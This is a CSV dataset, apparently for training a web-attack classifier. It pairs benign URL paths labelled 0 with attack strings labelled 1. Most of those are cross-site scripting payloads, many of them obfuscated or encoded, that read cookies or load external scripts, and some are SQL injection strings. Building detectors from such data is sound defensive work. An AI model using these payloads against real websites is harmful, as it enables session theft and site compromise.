payload,label
/product/detail?token=book361,0
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//\"";alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</SCRIPT>",1
">""<img src=""javascript:document.cookie=true;"">",1
/index.php?page=apple363,0
/index.php?user=contact542,0
<img/src=”x”/onerror=”alert(1)”/>,1
/home?page=2026284,0
/home?token=apple516,0
/login.html?id=hải628,0
/search?token=profile388,0
/home?q=2026742,0
/assets/style.css?category=2026253,0
/assets/style.css?user=contact102,0
/login.html?id=apple453,0
/login.html?id=2026245,0
/api/v1/users?category=hải678,0
/home?user=123523,0
/product/detail?token=contact586,0
/home?id=hải58,0
"<A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>",1
/search?category=shoes36,0
/login.html?category=hải490,0
/assets/style.css?token=apple72,0
">""<a href=""about:<script>document.cookie=true;</script>"">",1
/home?page=admin222,0
/index.php?token=2026598,0
/api/v1/users?user=profile843,0
/home?user=admin631,0
""" OR 1=1",1
/assets/style.css?id=apple240,0
/home?page=apple806,0
/product/detail?page=admin821,0
/index.php?user=book409,0
/product/detail?page=kma221,0
/product/detail?q=2026614,0
/home?q=123775,0
/product/detail?user=admin657,0
/product/detail?page=kma620,0
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%43%72%6F,1
/assets/style.css?category=profile325,0
/api/v1/users?category=2026817,0
/assets/style.css?user=book230,0
/home?token=shoes521,0
/api/v1/users?q=profile119,0
/login.html?token=2026311,0
/search?page=book977,0
/api/v1/users?token=book847,0
<script>document.cookie=true;//--></script>,1
/home?user=book628,0
/assets/style.css?id=profile807,0
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1
/search?page=123520,0
/home?id=admin206,0
/search?user=hải62,0
/product/detail?page=shoes845,0
/search?category=kma475,0
/login.html?category=book164,0
/login.html?category=shoes767,0
"<LINK REL=""stylesheet"" HREF=""javascript:document.cookie=true;"">",1
set system name <iframe src=http://www.vulnerability-lab.com>,1
/assets/style.css?id=123631,0
/index.php?user=apple568,0
"<param name=""movie"" value=""http://www.subhohalder.com/xysecteam.swf"" />",1
/login.html?category=2026781,0
/search?token=profile177,0
/search?category=book295,0
/product/detail?q=profile624,0
/login.html?page=kma967,0
/assets/style.css?page=2026290,0
/api/v1/users?user=shoes741,0
"<TABLE BACKGROUND=""javascript:alert('XSS')""></TABLE>",1
/login.html?q=admin805,0
/product/detail?page=profile531,0
&#X003C,1
/api/v1/users?id=shoes957,0
/home?token=shoes355,0
/home?category=profile736,0
j,1
/assets/style.css?user=apple737,0
/product/detail?token=20261,0
/home?category=contact422,0
/product/detail?id=book44,0
/product/detail?user=profile122,0
/login.html?token=book315,0
/api/v1/users?q=contact318,0
/api/v1/users?id=kma21,0
/product/detail?user=hải521,0
/login.html?category=book223,0
/index.php?id=contact868,0
/api/v1/users?category=profile143,0
/api/v1/users?page=admin103,0
/login.html?user=12341,0
/home?id=2026153,0
/home?token=kma63,0
/product/detail?q=admin192,0
/product/detail?id=apple573,0
/login.html?q=shoes310,0
/assets/style.css?page=hải10,0
/home?q=apple175,0
/api/v1/users?id=shoes689,0
/search?q=2026175,0
/assets/style.css?category=hải690,0
/api/v1/users?user=contact891,0
oncontextmenu=prompt(document.cookie),1
/search?category=contact673,0
/api/v1/users?category=admin378,0
<iframe/%00/ src=javaSCRIPT&colon;alert(1),1
/home?token=contact940,0
/assets/style.css?token=kma461,0
/search?category=profile637,0
/index.php?user=hải31,0
%3Cbody%20onload=alert(document.cookie)%3E,1
/home?category=book196,0
/api/v1/users?id=profile773,0
/login.html?page=kma586,0
/index.php?user=kma24,0
/index.php?id=admin301,0
/index.php?id=hải556,0
/product/detail?user=123835,0
/api/v1/users?category=apple736,0
/login.html?category=shoes632,0
/search?q=kma420,0
/index.php?token=apple225,0
/index.php?category=profile524,0
/home?id=hải695,0
/home?token=book459,0
/home?q=2026668,0
/search?category=book731,0
/home?token=apple757,0
/assets/style.css?q=contact676,0
/api/v1/users?id=book708,0
/home?user=123994,0
/index.php?token=admin663,0
/product/detail?id=book612,0
/assets/style.css?id=hải864,0
/assets/style.css?page=profile777,0
/index.php?token=profile94,0
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,1
/assets/style.css?category=admin386,0
/search?category=hải770,0
'><img/src=''onerror='alert(atob(/PDMgVHJlbGxv/.source)),1
/home?page=kma315,0
/api/v1/users?q=contact882,0
/home?id=123218,0
/login.html?user=2026422,0
/search?user=shoes274,0
/login.html?page=book683,0
">""&{document.cookie=true;};",1
/api/v1/users?q=2026295,0
>,1
/login.html?category=profile61,0
/api/v1/users?token=book533,0
/api/v1/users?page=123422,0
/product/detail?q=apple829,0
/search?token=shoes861,0
<script>alert(document.location)</script>,1
/assets/style.css?page=contact78,0
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
">""<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>",1
/api/v1/users?user=profile649,0
/api/v1/users?category=book105,0
/assets/style.css?id=kma579,0
/index.php?id=profile944,0
/assets/style.css?user=admin770,0
/home?token=hải213,0
/home?category=123472,0
/product/detail?q=admin361,0
/index.php?q=admin989,0
">""<BGSOUND SRC=""javascript:document.cookie=true;"">",1
/assets/style.css?category=shoes384,0
/login.html?user=contact216,0
?templid=1%27%22%3E%3Cscript%3Ealert%28%27XSS%20@%20%27%2bdocument.domain%29%3C%2fscript%3E,1
/assets/style.css?id=hải696,0
/home?page=book287,0
/api/v1/users?page=profile979,0
/product/detail?category=kma259,0
/login.html?category=book258,0
/home?user=apple78,0
/home?id=shoes298,0
/api/v1/users?category=book366,0
/home?id=profile424,0
/product/detail?token=shoes308,0
/assets/style.css?page=apple263,0
/product/detail?id=hải79,0
/api/v1/users?token=book974,0
/search?user=kma577,0
/assets/style.css?page=2026825,0
/assets/style.css?category=profile810,0
/index.php?token=profile799,0
/api/v1/users?token=apple986,0
/assets/style.css?user=hải144,0
set vlan name 1337 <script>alert(document.cookie)</script>,1
/assets/style.css?q=admin791,0
/home?page=book508,0
/login.html?user=shoes323,0
/product/detail?page=2026590,0
"<svg onload=""prompt(/xss by evan/);"">",1
"-1<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>",1
/product/detail?id=admin136,0
""" onfocusin=alert(1) autofocus x=""",1
/product/detail?token=book258,0
/home?token=profile814,0
/assets/style.css?user=kma27,0
/index.php?id=hải322,0
/product/detail?id=profile685,0
/assets/style.css?category=123762,0
/login.html?id=apple925,0
/product/detail?token=123681,0
/product/detail?user=contact1,0
/index.php?id=apple526,0
/product/detail?category=123867,0
/api/v1/users?category=shoes955,0
/index.php?user=admin885,0
/login.html?id=apple805,0
/product/detail?page=contact163,0
/search?user=shoes596,0
/search?category=shoes54,0
/login.html?q=hải838,0
/search?id=contact546,0
/search?category=123286,0
/product/detail?id=admin160,0
/product/detail?id=shoes949,0
"<param name=""salign"" value=""LT"" />",1
/login.html?id=profile324,0
/api/v1/users?id=admin88,0
/assets/style.css?id=123908,0
/api/v1/users?id=profile449,0
/product/detail?q=123124,0
/search?page=profile574,0
/login.html?token=shoes877,0
/home?user=contact520,0
/assets/style.css?q=shoes415,0
/assets/style.css?user=hải182,0
/product/detail?user=book652,0
/search?user=hải568,0
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('CrossSiteScripting');"">]]>",1
/index.php?id=admin569,0
/product/detail?page=hải414,0
/index.php?token=hải606,0
/assets/style.css?category=profile592,0
'OR%091=1--,1
/product/detail?token=123331,0
/search?category=kma995,0
/login.html?q=book593,0
/index.php?id=2026351,0
/search?user=profile777,0
-1¼script¾document.cookie=true;¼/script¾,1
/api/v1/users?user=admin449,0
/api/v1/users?id=book625,0
/index.php?id=book830,0
/product/detail?page=contact294,0
/product/detail?user=contact385,0
/index.php?q=contact19,0
/api/v1/users?page=contact665,0
/product/detail?q=book852,0
/search?user=shoes716,0
/assets/style.css?category=hải942,0
/home?q=2026782,0
/index.php?q=kma115,0
left:expression(eval(alert(1))),1
/home?token=shoes907,0
/search?page=profile442,0
/home?token=kma749,0
/index.php?token=apple454,0
/home?category=2026887,0
/api/v1/users?q=contact156,0
/assets/style.css?page=hải406,0
/product/detail?q=contact699,0
/search?q=profile53,0
/api/v1/users?id=apple794,0
/home?page=202641,0
/product/detail?page=profile887,0
/assets/style.css?q=123228,0
/assets/style.css?id=book346,0
/product/detail?token=kma350,0
/product/detail?category=2026933,0
/api/v1/users?page=kma805,0
/assets/style.css?q=shoes168,0
"<A HREF=""//www.google.com/"">XSS</A>",1
/assets/style.css?q=kma859,0
/assets/style.css?page=apple154,0
/login.html?user=2026341,0
/api/v1/users?token=admin85,0
/login.html?id=contact167,0
/product/detail?page=shoes304,0
/api/v1/users?category=admin234,0
<BODY ONLOAD=alert('XSS')>,1
/home?category=hải102,0
/api/v1/users?token=admin34,0
/index.php?token=hải471,0
-1&{document.cookie=true;};,1
/api/v1/users?page=book193,0
/search?user=2026251,0
/assets/style.css?user=contact737,0
/login.html?id=apple875,0
/product/detail?q=admin939,0
/search?user=admin333,0
/assets/style.css?user=hải514,0
/product/detail?id=apple90,0
/login.html?id=shoes201,0
/index.php?page=shoes779,0
/search?page=book305,0
/product/detail?token=hải254,0
/><script>alert('XSS')</script>,1
"<STYLE>li {list-style-image: url(""javascript:document.cookie=true;"");</STYLE><UL><LI>CrossSiteScripting",1
/assets/style.css?token=contact400,0
/product/detail?token=profile823,0
/product/detail?token=123385,0
/product/detail?user=admin592,0
/home?user=contact815,0
/product/detail?category=contact171,0
/search?category=contact385,0
">""<xml src=""javascript:document.cookie=true;"">",1
/home?page=shoes215,0
/api/v1/users?user=123556,0
/login.html?id=contact595,0
/assets/style.css?id=shoes920,0
/search?id=kma114,0
/home?page=admin946,0
“><iframe src=”/tests/cors/%23/tests/auditor.php?q1=<img/src=x onerror=alert(1)”,1
&#060;,1
/home?q=2026980,0
' #,1
/home?token=shoes537,0
/login.html?user=hải883,0
<svg><script>alert&#40/1/&#41</script>,1
' OR '1'='1,1
/search?q=123362,0
"-1<img src=""blah>"" onmouseover=""document.cookie=true;"">",1
/login.html?user=contact483,0
/home?category=profile343,0
"<?import namespace=""CrossSiteScripting"" implementation=""http://ha.ckers.org/CrossSiteScripting.htc"">",1
/api/v1/users?user=20261,0
<IMG SRC=javascript:alert('XSS')>,1
/search?user=contact537,0
/index.php?id=shoes480,0
/login.html?q=profile427,0
/product/detail?token=admin612,0
/api/v1/users?q=hải436,0
/home?token=hải196,0
/search?id=admin231,0
/product/detail?category=123225,0
/home?q=book819,0
/assets/style.css?token=hải573,0
/search?token=book572,0
/login.html?token=book511,0
/search?id=hải907,0
/home?category=apple758,0
/assets/style.css?page=123532,0
/search?category=apple345,0
/search?user=2026763,0
/api/v1/users?user=kma779,0
/home?token=hải112,0
/api/v1/users?id=hải100,0
/home?page=admin551,0
/home?id=kma469,0
/api/v1/users?id=admin959,0
/search?id=kma25,0
/search,0
/login.html?page=123574,0
/assets/style.css?token=kma747,0
/assets/style.css?q=book754,0
/home?page=123908,0
/search?category=shoes360,0
/login.html?q=kma356,0
/product/detail?page=profile495,0
/product/detail?category=profile133,0
/api/v1/users?page=shoes102,0
/index.php?page=book490,0
/product/detail?user=123753,0
%u003e%u0022%u0027%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0058%u0053%u0053%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,1
""") OR ""1""=""1""/*",1
/home?id=2026495,0
/assets/style.css?category=12336,0
/index.php?page=profile223,0
/product/detail?user=admin710,0
"1""sTYLe='acu:Expre/**/SSion(prompt(1))'bad="">",1
/search?token=admin151,0
/login.html?category=kma557,0
/index.php?id=book217,0
/assets/style.css?user=contact667,0
/api/v1/users?user=kma319,0
/home?q=kma118,0
/login.html?user=admin104,0
/search?id=123321,0
/index.php?id=contact146,0
/login.html?category=123813,0
/login.html?token=shoes729,0
/product/detail?token=book655,0
/home?category=profile105,0
/login.html?token=2026859,0
/assets/style.css?category=hải844,0
"-1<img src=""blah""onmouseover=""document.cookie=true;"">",1
/home?id=kma317,0
/search?category=123715,0
/index.php?q=book17,0
/assets/style.css?q=profile555,0
/home?id=shoes734,0
/assets/style.css?user=admin394,0
%2bADw-script%2bAD4-%0d%0aalert(1)%2bADw-%2fscript%2bAD4-,1
/api/v1/users?page=2026788,0
/api/v1/users?q=shoes875,0
/home?category=hải308,0
/home?token=book615,0
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,1
/home?id=contact480,0
""" OR 1=1/*",1
&#60,1
"<XML SRC=""xsstest.xml"" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
/product/detail?user=shoes542,0
/api/v1/users?user=kma221,0
/assets/style.css?token=contact701,0
/api/v1/users?category=apple348,0
/home?token=2026665,0
/index.php?page=apple208,0
/search?page=shoes813,0
/index.php?q=apple419,0
/login.html?user=profile162,0
/assets/style.css?id=kma543,0
/search?category=admin407,0
/search?token=profile118,0
/search?q=kma301,0
/index.php?page=profile369,0
/search?id=2026823,0
/login.html?q=2026283,0
/product/detail?user=kma570,0
/product/detail?q=hải439,0
/search?token=kma586,0
/index.php?token=apple564,0
/product/detail?user=shoes576,0
/product/detail?user=profile237,0
/product/detail?page=book125,0
/assets/style.css?user=2026485,0
/login.html?id=shoes351,0
/index.php?id=shoes11,0
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1
/search?id=admin988,0
/index.php?token=contact514,0
/home?id=contact629,0
/search?token=apple505,0
/api/v1/users?user=123943,0
/search?page=apple95,0
/login.html?page=2026681,0
/search?category=profile543,0
/index.php?user=book827,0
&#X0003c;,1
/assets/style.css?user=admin271,0
&#X00003c,1
/login.html?token=apple879,0
/search?id=shoes214,0
/index.php?id=profile557,0
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
/assets/style.css?token=2026859,0
/api/v1/users?user=kma841,0
/search?q=shoes533,0
"-1<bgsound src=""javascript:document.cookie=true;"">",1
/home?token=2026756,0
/login.html?page=profile33,0
/search?category=hải271,0
"<div style=""background-image: url(javascript:document.cookie=true;);"">",1
/api/v1/users?id=profile106,0
/search?q=hải904,0
/api/v1/users?q=admin405,0
/home?q=book865,0
/product/detail?page=book393,0
/assets/style.css?user=apple137,0
/home?id=profile338,0
/index.php?id=shoes208,0
/api/v1/users?q=kma945,0
/search?user=admin668,0
/assets/style.css?category=apple957,0
/login.html?token=hải390,0
/search?page=book715,0
/login.html?category=admin236,0
/assets/style.css?category=profile389,0
/search?category=123376,0
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE,1
/assets/style.css?token=contact519,0
/home?user=contact947,0
/home?token=contact362,0
/product/detail?category=book989,0
/product/detail?token=book396,0
/index.php?id=apple852,0
/index.php?q=123469,0
/search?category=contact936,0
/product/detail?category=book242,0
/assets/style.css?q=kma998,0
/index.php?user=2026700,0
/assets/style.css?category=kma763,0
/product/detail?token=123147,0
/product/detail?user=hải903,0
/product/detail?q=book688,0
/product/detail?token=2026309,0
/product/detail?token=kma718,0
/assets/style.css?user=shoes325,0
/assets/style.css?q=contact239,0
/search?q=profile388,0
/api/v1/users?user=admin928,0
/home?category=contact65,0
/login.html?token=2026952,0
/product/detail?page=shoes396,0
/index.php?q=profile312,0
/product/detail?user=kma721,0
/home?user=hải198,0
/home?id=admin886,0
/search?q=kma545,0
/api/v1/users?page=2026879,0
/search?token=kma192,0
"""><img src=1 onerror=alert(document.cookie);>",1
%0022%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e,1
&#x3C;&#x69;&#x66;&#x72;&#x61;&#x6D;&#x65;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x74;&#x65;&#x73;&#x74;&#x2E;&#x64;&#x65;&#x3E;,1
/product/detail?q=book2,0
/api/v1/users?id=1238,0
/home?page=123541,0
"<img src=""blah""onmouseover=""document.cookie=true;"">",1
/search?category=apple867,0
/product/detail?token=apple418,0
&#X000003c;,1
"<SCR\0IPT>alert(""XSS"")</SCR\0IPT>",1
/search?id=apple471,0
/product/detail?token=hải659,0
/api/v1/users?user=profile826,0
/index.php?category=contact239,0
/home?token=book827,0
/home?q=admin430,0
/home?category=admin548,0
/product/detail?token=apple931,0
/search?page=contact717,0
<BODY ONLOAD=document.cookie=true;>,1
/assets/style.css?id=book640,0
/index.php?page=book598,0
/api/v1/users?id=book550,0
/login.html?page=contact277,0
/api/v1/users?token=book40,0
/index.php?user=contact347,0
/assets/style.css?category=apple133,0
/search?category=admin216,0
/home?user=2026534,0
/api/v1/users?token=2026883,0
/assets/style.css?q=shoes892,0
/assets/style.css?q=202677,0
/product/detail?page=contact841,0
/login.html?id=profile951,0
/product/detail?page=book740,0
/product/detail?user=admin239,0
"""><option>""><button>img src=x onerror=alert(/xss/);></button></option>",1
[url=javascript:alert(1);]click me[/url],1
/product/detail?user=book288,0
/search?category=admin422,0
/api/v1/users?token=admin250,0
/home?q=kma708,0
/product/detail?id=profile317,0
/assets/style.css?page=hải495,0
/login.html?q=kma10,0
/index.php?id=kma804,0
/home?page=kma111,0
/search?category=book62,0
/home?token=profile135,0
/search?id=kma210,0
/product/detail?page=apple186,0
">""'><script>alert('XSS')</script>",1
/assets/style.css?page=apple852,0
/index.php?category=kma361,0
/product/detail?page=admin501,0
/product/detail?id=profile511,0
/home?token=123564,0
/search?page=admin827,0
/login.html?page=123114,0
">""<STYLE>li {list-style-image: url(""javascript:document.cookie=true;"");</STYLE><UL><LI>CrossSiteScripting",1
/home?token=123958,0
""" OR 1=1--",1
/login.html?q=123813,0
/assets/style.css?id=profile187,0
/product/detail?category=shoes530,0
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,1
/product/detail?id=apple681,0
/api/v1/users?token=2026895,0
/assets/style.css?q=contact305,0
/home?category=shoes798,0
/home?token=123390,0
">""<iframe src=http://vulnerability-lab.com/>@gmail.com",1
/login.html?token=hải156,0
/login.html?token=admin987,0
/product/detail?page=2026723,0
/login.html?id=book600,0
/login.html?token=admin291,0
/search?q=admin778,0
/index.php?page=apple185,0
/assets/style.css?id=hải362,0
/home?page=123918,0
/search?id=kma116,0
/home?token=2026455,0
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,1
/api/v1/users?q=apple422,0
/assets/style.css?token=apple387,0
/product/detail?page=123872,0
/search?page=contact828,0
/index.php?id=123481,0
/assets/style.css?token=profile19,0
/search?page=book997,0
&#X000003c,1
/search?user=book432,0
<SCRIPT>a=/XSS/%0a%0dalert(a.source)</SCRIPT>,1
/product/detail?q=book68,0
/index.php?user=kma641,0
/api/v1/users?id=shoes184,0
/product/detail?id=admin553,0
/product/detail?q=admin872,0
"<svg><![CDATA[><imagexlink:href=""]]><img/src=xx:xonerror=alert(2)//""></svg>",1
/product/detail?q=apple288,0
/search?q=kma367,0
/product/detail?category=2026665,0
/search?id=admin885,0
/index.php?q=profile13,0
/index.php?user=shoes147,0
/api/v1/users?id=profile820,0
/search?token=admin243,0
/product/detail?token=kma5,0
/product/detail?q=admin311,0
/index.php?q=shoes715,0
/assets/style.css?token=123409,0
/login.html?id=hải61,0
/assets/style.css?id=book341,0
/index.php?category=202631,0
/api/v1/users?q=hải116,0
/search?user=book820,0
/product/detail?token=123705,0
/search?q=kma557,0
/login.html?q=202665,0
/api/v1/users?q=kma574,0
/api/v1/users?id=kma356,0
/assets/style.css?page=hải356,0
/index.php?id=apple376,0
/index.php?q=contact973,0
/search?id=contact506,0
/home?page=123845,0
/product/detail?q=contact460,0
/login.html?page=2026271,0
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>",1
/index.php?id=apple853,0
/api/v1/users?id=profile101,0
"<script>alert(document.cookie)</script><div style=""1@gmail.com",1
">""<img dynsrc=""javascript:document.cookie=true;"">",1
/index.php?token=book417,0
/search?category=admin291,0
/index.php?page=123588,0
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/,1
/product/detail?id=admin516,0
/login.html?category=shoes379,0
/api/v1/users?q=admin490,0
/index.php?q=admin632,0
/home?page=hải9,0
"-1<a href=""javascript#document.cookie=true;"">",1
/login.html?id=123328,0
<body onload=prompt(1);>,1
/product/detail?page=apple512,0
/login.html?user=admin968,0
/index.php?token=book661,0
/api/v1/users?id=contact776,0
/api/v1/users?id=profile502,0
/home?user=apple229,0
/assets/style.css?page=contact176,0
/api/v1/users?page=admin840,0
/index.php?q=12377,0
/search?category=contact489,0
/index.php?page=book535,0
</TITLE><SCRIPT>document.cookie=true;</SCRIPT>,1
/search?q=kma385,0
/search?q=profile287,0
/product/detail?token=kma942,0
/search?page=contact449,0
/index.php?q=book785,0
/index.php?token=apple672,0
/index.php?user=123272,0
/product/detail?token=123666,0
/login.html?q=profile450,0
/home?token=hải579,0
/api/v1/users?category=123397,0
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",1
/product/detail?id=apple777,0
"<form><isindex formaction=""javascript&colon;confirm(1)""",1
/index.php?id=profile156,0
/home?q=123459,0
/home?q=admin576,0
/index.php?id=123539,0
/home?id=apple311,0
/assets/style.css?category=2026872,0
/home?q=admin651,0
/search?page=admin783,0
/product/detail?id=12386,0
/api/v1/users?token=contact147,0
/api/v1/users?user=contact975,0
/api/v1/users?q=book633,0
/api/v1/users?user=kma213,0
/home?id=2026344,0
/index.php?user=profile690,0
/search?q=apple390,0
/index.php?user=profile670,0
/home?page=apple89,0
/index.php?category=shoes644,0
/home?page=profile577,0
/api/v1/users?page=contact603,0
/api/v1/users?id=book149,0
set system contact <script>alert('VL')</script>,1
/search?page=kma702,0
/login.html?page=book282,0
<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>,1
/api/v1/users?q=2026587,0
/product/detail?page=contact823,0
/index.php?page=profile499,0
/index.php?id=shoes257,0
/index.php?user=shoes606,0
/login.html?token=admin43,0
/login.html?q=hải540,0
/home?token=kma535,0
<HTML xmlns:CrossSiteScripting>,1
/home?user=book768,0
/search?page=profile39,0
/login.html?token=123888,0
/login.html?page=1238,0
/assets/style.css?token=hải216,0
/product/detail?id=book545,0
/api/v1/users?token=profile779,0
/index.php?token=contact367,0
/api/v1/users?user=kma465,0
this['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]](),1
/product/detail?id=profile477,0
/login.html?user=admin953,0
/login.html?category=apple700,0
/search?page=2026282,0
"<IMG DYNSRC=""javascript:document.cookie=true;"">",1
/index.php?page=contact899,0
/index.php?category=book813,0
/product/detail?user=apple594,0
/assets/style.css?token=shoes308,0
"""></TITLE><SCRIPT>alert(document.cookie);</SCRIPT>",1
/api/v1/users?user=profile940,0
/search?token=hải605,0
/api/v1/users?page=shoes501,0
/assets/style.css?user=admin335,0
/login.html?q=admin951,0
/product/detail?category=kma398,0
/product/detail?category=apple593,0
"<IMG SRC=`javascript:alert(""uceka says, 'XSS'"")`>",1
/assets/style.css?token=apple995,0
/home?q=2026503,0
/product/detail?token=123863,0
/home?category=hải567,0
/index.php?user=123974,0
/login.html?id=shoes901,0
/api/v1/users?page=hải714,0
/assets/style.css?id=kma901,0
/login.html?category=kma295,0
/login.html?id=apple237,0
/search?user=shoes985,0
/login.html?category=contact421,0
/index.php?user=123886,0
/home?user=shoes849,0
/product/detail?user=2026192,0
/assets/style.css?id=2026186,0
/product/detail?token=123375,0
/index.php?token=profile804,0
/login.html?id=2026525,0
/home?user=kma714,0
/assets/style.css?token=book683,0
/search?user=admin618,0
/search?page=shoes709,0
/assets/style.css?q=contact415,0
/product/detail?category=profile317,0
/search?category=2026385,0
&#x03C,1
/assets/style.css?user=contact845,0
/home?page=book435,0
"<TABLE><TD BACKGROUND=""javascript:document.cookie=true;"">",1
"'""--></style></script><script>alert(/xss/)</script>",1
/home?page=123882,0
/search?id=book193,0
/product/detail?page=2026747,0
">""<bgsound src=""javascript:document.cookie=true;"">",1
/search?user=kma396,0
/home?category=hải30,0
"d=""alert('XSS');\"")"";",1
"<a href=""javascript&colon;alert&lpar;document&period;domain&rpar;"">Click Here</a>",1
"""/><script>alert(document.cookie);</script>",1
/login.html?q=2026233,0
/index.php?category=2026255,0
/index.php?user=apple693,0
/login.html?q=profile594,0
/search?token=123828,0
/assets/style.css?user=profile288,0
/product/detail?id=apple489,0
&{document.cookie=true;};,1
/index.php?page=2026942,0
/api/v1/users?page=kma261,0
/assets/style.css?id=2026660,0
/assets/style.css?q=book209,0
/home?user=admin413,0
/home?user=profile441,0
/api/v1/users?page=hải122,0
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>,1
/login.html?id=kma177,0
/index.php?category=2026508,0
/api/v1/users?id=kma748,0
/login.html?category=contact54,0
/index.php?token=contact841,0
/login.html?id=admin365,0
/assets/style.css?q=123306,0
/login.html?user=apple920,0
/api/v1/users?user=hải919,0
/api/v1/users?user=contact297,0
/search?page=123263,0
/assets/style.css?category=profile397,0
/api/v1/users?user=contact225,0
/login.html?id=kma624,0
"-1<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>document.cookie=true</SCRIPT>"">",1
/index.php?user=book627,0
/login.html?page=2026160,0
"-1<div onmouseover=""document.cookie=true;"">",1
/api/v1/users?user=profile814,0
/api/v1/users?category=hải947,0
/search?q=contact184,0
"<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
/index.php?id=kma131,0
/search?token=apple602,0
/assets/style.css?category=shoes253,0
/home?id=profile549,0
"<IMG SRC=""   javascript:alert('CrossSiteScripting');"">",1
/search?user=book418,0
/product/detail?q=book271,0
/search?page=book725,0
/product/detail?page=kma666,0
/api/v1/users?token=2026398,0
/login.html?category=123354,0
/assets/style.css?category=apple447,0
/api/v1/users?token=kma477,0
/search?category=hải191,0
/api/v1/users?token=shoes352,0
/index.php?q=2026992,0
/api/v1/users?page=admin704,0
/home?user=kma758,0
/index.php?id=apple27,0
/index.php?page=apple472,0
/assets/style.css?category=kma264,0
/assets/style.css?token=apple448,0
/assets/style.css?q=hải770,0
/assets/style.css?category=profile486,0
/product/detail?token=shoes806,0
/api/v1/users?token=apple163,0
/product/detail?user=apple120,0
/login.html?id=kma396,0
/product/detail?q=shoes280,0
/product/detail?category=hải550,0
/api/v1/users?user=profile948,0
/api/v1/users?token=2026145,0
/index.php?token=apple165,0
/search?category=shoes214,0
/index.php?q=kma118,0
/product/detail?id=book723,0
/home?q=profile266,0
/home?category=book395,0
/product/detail?q=2026903,0
/assets/style.css?q=kma756,0
/product/detail?category=contact980,0
/index.php?q=2026948,0
<script x> alert(1) </script 1=2,1
